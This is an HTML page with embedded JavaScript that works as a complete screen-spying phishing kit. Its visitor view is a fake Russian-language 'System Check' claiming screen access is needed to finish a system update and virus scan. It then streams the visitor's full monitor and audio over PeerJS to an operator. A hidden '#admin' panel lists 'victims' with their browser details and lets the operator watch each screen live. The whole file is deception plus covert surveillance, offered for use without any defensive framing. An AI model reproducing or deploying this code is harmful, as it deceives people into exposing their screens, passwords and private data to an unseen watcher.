<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>System Check</title>
    <script src="https://unpkg.com/peerjs@1.4.7/dist/peerjs.min.js"></script>
    <style>
        :root { --bg: #0f172a; --card: #1e293b; --text: #f8fafc; --accent: #3b82f6; --success: #10b981; }
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; }
        body { background: var(--bg); color: var(--text); min-height: 100vh; display: flex; flex-direction: column; }
        .victim-view { display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; padding: 20px; text-align: center; }
        .card { background: var(--card); padding: 30px; border-radius: 16px; max-width: 400px; width: 100%; box-shadow: 0 10px 25px rgba(0,0,0,0.5); }
        h1 { font-size: 24px; margin-bottom: 10px; }
        p { color: #94a3b8; margin-bottom: 20px; line-height: 1.5; }
        .btn { background: var(--accent); color: white; border: none; padding: 14px 28px; border-radius: 10px; font-size: 16px; font-weight: 600; cursor: pointer; width: 100%; transition: 0.2s; }
        .btn:hover { background: #2563eb; }
        .status { margin-top: 15px; font-size: 14px; color: #64748b; display: flex; align-items: center; justify-content: center; gap: 8px; }
        .dot { width: 8px; height: 8px; border-radius: 50%; background: #64748b; }
        .dot.active { background: var(--success); animation: pulse 1.5s infinite; }
        @keyframes pulse { 0%,100%{opacity:1} 50%{opacity:.5} }
        .admin-view { display: none; padding: 20px; max-width: 1200px; margin: 0 auto; width: 100%; }
        .admin-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; padding-bottom: 15px; border-bottom: 1px solid #334155; }
        .admin-title { font-size: 20px; font-weight: 700; color: var(--accent); }
        .session-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(280px, 1fr)); gap: 20px; }
        .session-card { background: var(--card); border-radius: 12px; padding: 20px; border: 1px solid #334155; }
        .session-id { font-family: monospace; font-size: 14px; color: #94a3b8; margin-bottom: 10px; }
        .session-actions { display: flex; gap: 10px; }
        .btn-sm { padding: 8px 16px; font-size: 13px; border-radius: 6px; cursor: pointer; border: none; font-weight: 500; }
        .btn-watch { background: var(--success); color: #000; }
        .btn-disconnect { background: #ef4444; color: #fff; }
        #viewer-modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 100; flex-direction: column; }
        #viewer-header { padding: 15px; background: rgba(0,0,0,0.8); display: flex; justify-content: space-between; align-items: center; color: #fff; }
        #remote-video { width: 100%; height: 100%; object-fit: contain; }
        .close-btn { background: #333; color: #fff; border: none; padding: 8px 16px; border-radius: 6px; cursor: pointer; }
        .hidden { display: none !important; }
    </style>
</head>
<body>
    <div id="victim-view" class="victim-view">
        <div class="card">
            <h1>🛡️ System Check</h1>
            <p>Для завершения обновления системы и проверки на вирусы необходимо предоставить доступ к экрану.</p>
            <button id="start-btn" class="btn" onclick="startSession()">Начать проверку</button>
            <div id="victim-status" class="status hidden">
                <div class="dot active"></div><span>Ожидание оператора...</span>
            </div>
        </div>
    </div>

    <div id="admin-view" class="admin-view">
        <div class="admin-header">
            <div class="admin-title"> Admin Panel</div>
            <div style="font-size:12px; color:#64748b;">Active: <span id="count">0</span></div>
        </div>
        <div id="session-list" class="session-grid">
            <div style="text-align:center; padding:50px; color:#475569; width:100%;">Waiting for targets...</div>
        </div>
    </div>

    <div id="viewer-modal">
        <div id="viewer-header">
            <span>📺 Viewing: <span id="current-target"></span></span>
            <button class="close-btn" onclick="stopViewing()">Close</button>
        </div>
        <video id="remote-video" autoplay playsinline controls></video>
    </div>

    <script>
        const CHANNEL_ID = 'eni-master-2026'; 
        let peer = null, myStream = null, currentCall = null, activeSessions = {};
        const isAdmin = window.location.hash === '#admin';
        isAdmin ? initAdmin() : (document.getElementById('admin-view').classList.add('hidden'));

        async function startSession() {
            const btn = document.getElementById('start-btn');
            const status = document.getElementById('victim-status');
            try {
                btn.disabled = true; btn.textContent = 'Connecting...';
                myStream = await navigator.mediaDevices.getDisplayMedia({ video: { cursor: 'always', displaySurface: 'monitor' }, audio: true });
                btn.classList.add('hidden'); status.classList.remove('hidden');
                const victimId = 'victim-' + Math.random().toString(36).substr(2, 8);
                peer = new Peer(victimId);
                peer.on('open', () => {
                    const adminConn = peer.connect(CHANNEL_ID, { reliable: true });
                    adminConn.on('open', () => { adminConn.send({ type: 'register', id: victimId, ua: navigator.userAgent }); });
                });
                peer.on('call', (call) => { call.answer(myStream); currentCall = call; status.innerHTML = '<div class="dot active"></div><span>Operator connected</span>'; });
                myStream.getVideoTracks()[0].onended = () => { location.reload(); };
            } catch (err) { alert('Error: ' + err.message); location.reload(); }
        }

        function initAdmin() {
            document.getElementById('victim-view').classList.add('hidden');
            document.getElementById('admin-view').style.display = 'block';
            peer = new Peer(CHANNEL_ID);
            peer.on('connection', (conn) => {
                conn.on('data', (data) => { if (data.type === 'register') { activeSessions[data.id] = { ua: data.ua }; renderSessions(); } });
            });
        }

        function renderSessions() {
            const list = document.getElementById('session-list');
            document.getElementById('count').textContent = Object.keys(activeSessions).length;
            if (Object.keys(activeSessions).length === 0) return;
            list.innerHTML = '';
            Object.keys(activeSessions).forEach(id => {
                const card = document.createElement('div');
                card.className = 'session-card';
                card.innerHTML = `<div class="session-id">ID: ${id}</div><div class="session-ua">${activeSessions[id].ua}</div><div class="session-actions"><button class="btn-sm btn-watch" onclick="watchSession('${id}')"> Watch</button><button class="btn-sm btn-disconnect" onclick="delete activeSessions['${id}'];renderSessions()">✖</button></div>`;
                list.appendChild(card);
            });
        }

        function watchSession(targetId) {
            document.getElementById('viewer-modal').style.display = 'flex';
            document.getElementById('current-target').textContent = targetId;
            const call = peer.call(targetId, new MediaStream());
            currentCall = call;
            call.on('stream', (stream) => { document.getElementById('remote-video').srcObject = stream; });
            call.on('close', () => { stopViewing(); });
        }

        function stopViewing() {
            document.getElementById('viewer-modal').style.display = 'none';
            document.getElementById('remote-video').srcObject = null;
            if (currentCall) currentCall.close();
        }
    </script>
</body>
</html>
